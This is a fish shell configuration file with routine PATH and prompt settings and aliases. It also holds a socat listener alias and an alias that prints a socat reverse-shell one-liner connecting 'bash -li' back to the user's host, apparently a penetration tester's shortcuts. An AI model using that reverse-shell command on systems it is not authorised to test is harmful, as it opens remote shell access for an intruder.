if status is-login
    contains ~/.local/bin $PATH
    or set PATH ~/.local/bin $PATH
end

if status is-interactive
    set theme_complete_path yes
    set fish_prompt_pwd_dir_length 0
end

alias px='proxychains -q'
alias ls='ls --color=auto'
alias ll='ls --color=auto -lah'
alias copy='rsync -ah --info=progress2'
alias solisten='socat file:`tty`,raw,echo=0 tcp-listen:$LPORT'
alias soconn='echo "socat exec:\"bash -li\",pty,stderr,setsid,sigint,sane tcp:[(hostname -i)]:$LPORT"'

#set -x CC /usr/bin/musl-gcc

umask 002
